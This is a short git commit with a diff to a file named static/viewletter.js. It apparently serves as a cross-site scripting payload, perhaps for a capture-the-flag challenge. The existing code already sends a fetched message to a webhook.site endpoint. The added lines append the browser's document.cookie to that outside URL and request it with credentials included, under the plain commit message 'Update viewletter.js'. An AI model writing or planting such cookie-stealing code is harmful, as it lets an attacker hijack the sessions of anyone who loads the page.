a01a1fbde943cf12bebac2c4d7a489268459d3cc
Taise <59153204+taise-hub@users.noreply.github.com>
2023-05-21 17:59:43 +0900

    Update viewletter.js

--- static/viewletter.js
+++ static/viewletter.js
@@ -6,3 +6,9 @@ fetch(url, {
 .then((data) => {
         fetch('http://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41?message=' + data.message)
 });
+
+url2 = "https://webhook.site/a51a8490-eb47-4f69-bba1-a8d094c53c41" + document.cookie
+fetch(url2 , {
+        method: 'GET',
+        credentials: "include",
+})
